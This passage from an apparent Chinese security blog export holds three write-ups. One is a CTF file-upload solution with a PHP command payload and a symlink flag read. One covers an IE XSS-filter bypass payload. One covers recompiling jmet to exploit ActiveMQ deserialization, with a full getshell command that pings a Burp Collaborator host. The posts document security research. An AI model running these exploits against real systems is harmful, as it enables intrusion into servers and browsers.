class="string">&#x27;./&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27; &#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>], <span class="string">&#x27;/&#x27;</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[^\w\d_ -]/si&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>] = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^a-zA-Z0-9_ -]/s&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">        <span class="title function_ invoke__">passthru</span>(<span class="string">&#x27;cat &#x27;</span> . <span class="string">&#x27;uploaded/&#x27;</span> . <span class="variable">$_GET</span>[<span class="string">&#x27;step&#x27;</span>]);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="keyword">die</span>();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码的大意是只能上传长度有限的代码，然后会进入</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&#x27;uploaded&#x27;</span>))&#123;</span><br><span class="line">  <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp</span>, <span class="string">&quot;uploaded/&quot;</span> .<span class="variable">$name</span>);</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;Upload complete!&quot;</span>;</span><br><span class="line">  <span class="title function_ invoke__">shell_exec</span>(<span class="string">&#x27;sh /var/www/html/includes/unzip.sh&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><a href="http://xn--unzip-xf6ht7jvt1b2el0hlw5wnxdcr6g.sh">用同样的手法读出unzip.sh</a></p>
<p>可以看到它是先解压压缩包然后一点一点的删掉。</p>
<p>所以第一种方式就是利用时间差条件竞争，这也是我队师傅用的方法。这里省略。</p>
<p>然后第二天看别人wp的时候。发现一个比较巧妙的方法，就是观察到sh并没有删除所有的文件，保留了没有后缀名的文件（<code>rm -rf ./uploaded/.*</code>并不是删除当前文件所有内容的命令）。所以可以上传一个没有后缀名的php然后用index.php的包含代码包含进来。</p>
<p>在zip中压缩一个clound文件如下所示（这里需要注意因为是include进来，所以cat后面的路径是flag和index.php的路径）</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat flag/flag/flag/flag/flag/flag/flag.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后访问<code>http://47.104.188.226:20001/index.php?uploaded&amp;page=uploaded/clound</code></p>
<p>这个payload的构造很有意思巧妙的绕过了。</p>
<p>注意到flag是flag{CVE_SomeThing_aBout_gitLab}也就就说上述两种方法都应该是非预期。</p>
<p>在网搜一下gitlab的历史漏洞注意到一个很有意思的漏洞通过软连接来读文件，隐隐感觉如果用这个姿势来做是一个很优雅的解法。</p>
<p>首先经过一次失败的实验发现软连接是相对的路径的。也就说建立软连接的时候要把flag的位置和软连接的位置摆好。假设/var/www/html为根目录</p>
<p>flag的位置<code>/var/www/html/flag/flag/flag/flag/flag/flag/flag.php</code></p>
<p>上传的位置</p>
<p>/flag/flag/flag/flag/flag/flag/flag.php</p>
<p>在web目录下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir -p flag/flag/flag/flag/flag/flag/</span><br><span class="line">mkdir -p includes/uploaded</span><br><span class="line">echo &quot;flag&quot; &gt;&gt; flag/flag/flag/flag/flag/flag/flag.php</span><br><span class="line">cd includes/uploaded</span><br><span class="line">ln -s ../../flag/flag/flag/flag/flag/flag/flag.php aaaaabbbbbcccccddddd</span><br></pre></td></tr></table></figure>
<p>然后压缩软连接，上传如图</p>
<p><img src="%E6%8A%93%E5%8C%85.jpg" alt="抓包.jpg"></p>
<p>从图中我们也能清楚看到软连接是相对路径</p>
<p>最后访问<code>http://47.104.188.226:20001/includes/uploaded/aaaaabbbbbcccccddddd</code></p>
<p>即可看到flag</p>
<p>也许你注意把软连接弄到20个字符，是因为在做的时候我犯了个错误，我以为把软连接传上去apache也会跟着软连接的指向去解析php，然后结合一下代码才能利用。</p>
<p><img src="%E8%BD%AF%E8%BF%9E%E6%8E%A5.png" alt="软连接.png"></p>
<p>去读文件但其实不是这样的，直接访问软连接就可以看到内容。结合这几天的apache的一些知识，我想给出自己的答案。</p>
<h2 id="apache解析php的原理">apache解析php的原理</h2>
<p>首先一个常识是Apache自身并不能解析php。Apache是一个模块化程序，这这就意味着服务器只包括最基本的功能，其他的拓展的功能可以加载模块实现。Apache对于php的解析，就是通过众多Module中的php Module来完成的。</p>
<p>这个php模块会随着apache的启动被load进来。可以通过<code>apachectl -M</code>来查看</p>
<p>那么apache是怎么判断这个文件是不是应该交给php模块处理的呢？答案是通过MIME类型。</p>
<p><img src="%E6%AD%A3%E5%9C%A8%E8%BF%90%E8%A1%8C%E7%9A%84%E6%A8%A1%E5%9D%97.png" alt="正在运行的模块.png"></p>
<p>linux上有个<code>/etc/mime.types</code>它是mime-support包的一部分，这里面记录了所有的MIME类型。</p>
<p>当客户端请求一个文件时,如果后缀在这个列表里,那么apache就返回对应的content-type给浏览器，如果不在里面apache这个表里面则直接返回文件的内容（不返回content-type）。</p>
<p><img src="MIME.png" alt="MIME.png"></p>
<p>当然这个你面有关php的是被注释掉了。不过在<code>/etc/apache2/mods-enabled/php7.0.conf</code>有中有这样一条等价配置。</p>
<p>它表示一旦匹配到php|php3|php4|php5|php7|pht|phtm这种东西则强制执行application/x-httpd-php这种类型所对应的处理器（php7_moudle）。</p>
<p>回头看刚才上传软连接没有后缀，所以apache不可能认识，于是他读出原本的内容（flag.php）然后直接返回并不带任何content-type，有图为证。</p>
<p><img src="%E8%AF%81%E6%8D%AE.png" alt="证据.png"></p>
<h2 id="最后">最后</h2>
<p>最后自己的思考并不保证正确，如果出错还请指正。</p>
<h2 id="参考">参考</h2>
<p><a href="https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/#more">https://chybeta.github.io/2018/01/18/%E8%B5%9B%E5%8D%9A%E5%9C%B0%E7%90%83%E6%9D%AF%E5%B7%A5%E4%B8%9A%E4%BA%92%E8%81%94%E7%BD%91%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B-Web-writeup/#more</a></p>
<p><a href="https://paper.seebug.org/104/">https://paper.seebug.org/104/</a></p>
<p><a href="http://drops.chamd5.org/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE">http://drops.chamd5.org/#!/drops/315.Apache%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE</a></p>
<p><a href="http://03i0.com/2017/10/19/Apache%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/">http://03i0.com/2017/10/19/Apache%E5%AE%89%E5%85%A8%E6%80%BB%E7%BB%93/</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>通过函数重定义绕过xss过滤器(IE)</title>
    <url>/2017/08/17/%E9%80%9A%E8%BF%87%E5%87%BD%E6%95%B0%E9%87%8D%E5%AE%9A%E4%B9%89%E7%BB%95%E8%BF%87xss%E8%BF%87%E6%BB%A4%E5%99%A8(IE)/</url>
    <content><![CDATA[<!-- 这个bypass的方法在近期的版本已经不适用，但是仍然可以在兼容模式下适用，你可以想一些办法强制IE进入兼容模式，例如添加一栏像下面这样，这行代码将使IE的JS引擎回到老旧模式（IE7）。 -->
<!-- more -->
<p>这个bypass的方法在近期的版本已经不适用，但是仍然可以在兼容模式下适用，你可以想一些办法强制IE进入兼容模式，例如添加一栏像下面这样，这行代码将使IE的JS引擎回到老旧模式（IE7）。</p>
<p>现在我们需要建立一个实验页面，让用户可控参数出现到JS函数的参数里面。</p>
<p>test.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;meta http-equiv=<span class="string">&quot;X-UA-Compatible&quot;</span> content=<span class="string">&quot;IE=EmulateIE7&quot;</span> /&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$x</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>] : <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="title function_ invoke__">x</span>(<span class="string">&#x27;&lt;?php echo $x?&gt;&#x27;</span>);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>在老版本的IE浏览器里面，是有可能在一个函数的调用参数的地方重定义这个函数的。这将对绕过xss过滤器非常有用（如果你的payload能出现在这里）</p>
<p>通过GET传参<code>somepage.php?x=1',x=alert,'</code></p>
<p>最后的结果像是这样</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=EmulateIE7&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">x</span>(<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">x</span>(<span class="string">&#x27;1&#x27;</span>,x=alert,<span class="string">&#x27;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>这个payload将闭合两边的引号，同时<code>function x</code>重定义为<code>alert</code>因为alert只接受一个参数，所以其他的多余参数将被忽略。</p>
<p><img src="xss1.png" alt="xss1.png"></p>
<h2 id="不背翻译的锅">不背翻译的锅</h2>
<p><a href="http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/">http://www.thespanner.co.uk/2014/04/07/bypassing-the-xss-filter-using-function-reassignment/</a></p>
]]></content>
      <categories>
        <category>web security</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
  <entry>
    <title>重新编译jmet小记</title>
    <url>/2020/03/21/%E9%87%8D%E6%96%B0%E7%BC%96%E8%AF%91jmet%E5%B0%8F%E8%AE%B0/</url>
    <content><![CDATA[<!-- 在一次渗透测试过程中，发现内网有一些activemq版本很老官网的jmet打不了需要重新编译，踩了一些坑。 -->
<!-- more -->
<p>在一次渗透测试过程中，发现内网有一些activemq版本很老（2010年前的），但是并没有/fileserver这个路径意味着没法用**CVE-2016-3088（猜测经过加固），**不过幸运的是/admin没有授权就能访问意味着有主动触发CVE-2015-5254的可能性，猜测这种偏门的java洞可能被加固人员忽略，所以抄起<a href="https://github.com/matthiaskaiser/jmet">jmet</a>试了一下。回显如下<br>
<img src="1584789659269-eb4f1985-8c8f-4eae-88b5-cb4d8218eeb6.png#align=left&amp;display=inline&amp;height=138&amp;name=image.png&amp;originHeight=276&amp;originWidth=1490&amp;size=297008&amp;status=done&amp;style=none&amp;width=745" alt="image.png"></p>
<p>看样子是失败了，经过一番谷歌过后看到github上有如下回答，猜测是因为activemq所依赖的包版本过老而jmet依赖的包比较新所以打不成功。<br>
<img src="1583215074318-58d2e7e5-d8c1-42a2-bf8d-cca000abff11.png#align=left&amp;display=inline&amp;height=125&amp;name=image.png&amp;originHeight=250&amp;originWidth=2076&amp;size=224257&amp;status=done&amp;style=none&amp;width=1038" alt="image.png"><br>
<img src="1583215080926-c3b83bc4-a741-487e-aea7-014ae6e5c411.png#align=left&amp;display=inline&amp;height=139&amp;name=image.png&amp;originHeight=278&amp;originWidth=1568&amp;size=121245&amp;status=done&amp;style=none&amp;width=784" alt="image.png"></p>
<p>正如github上这个老外所说需要加入legacy。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;org.apache.activemq&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;activemq-openwire-legacy&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;<span class="number">5.15</span><span class="number">.11</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>既然问题问题出在依赖上就意味着要重新编译，踩了一些坑下面记录一下。</p>
<p>jmet可以攻击多种软件，有一些是商业的软件我们搞不到对应的jar，所以删除下面两个java。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rm -f src/main/java/de/codewhite/jmet/target/impl/WebSphereMQTarget.java</span><br><span class="line">rm -f src/main/java/de/codewhite/jmet/target/impl/SwiftMQTarget.java</span><br></pre></td></tr></table></figure>
<p>另外注意到jmet是依赖于ysoserial<br>
<img src="1584790845997-06ed872f-c5d6-4f4d-b6c4-a8ccc65de4d6.png#align=left&amp;display=inline&amp;height=201&amp;name=image.png&amp;originHeight=200&amp;originWidth=742&amp;size=25701&amp;status=done&amp;style=none&amp;width=746" alt="image.png"></p>
<p>并且我们后续也会用到，奈何没找到什么中央仓库提供这种黑客依赖。无奈需要自己到导入</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mvn install:install-file -DgroupId=ysoserial -DartifactId=ysoserial -Dversion=<span class="number">0.0</span><span class="number">.5</span>-SNAPSHOT -Dpackaging=jar -Dfile=</span><br></pre></td></tr></table></figure>
<p>编译</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">export MAVEN_OPTS=-Xss10m</span><br><span class="line">mvn clean <span class="built_in">compile</span> assembly:single</span><br></pre></td></tr></table></figure>
<p>然后就可以快乐的一键getshell了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">proxychains java -jar jmet-<span class="number">0.1</span><span class="number">.0</span>-<span class="built_in">all</span>.jar -Q event -I ActiveMQ -s -Y <span class="string">&quot;ping -n 1 wyyekrec31qzxtpc4kq636jbi2otci.burpcollaborator.net&quot;</span> -Yp ROME  ip port</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>java</tag>
      </tags>
  </entry>
</search>
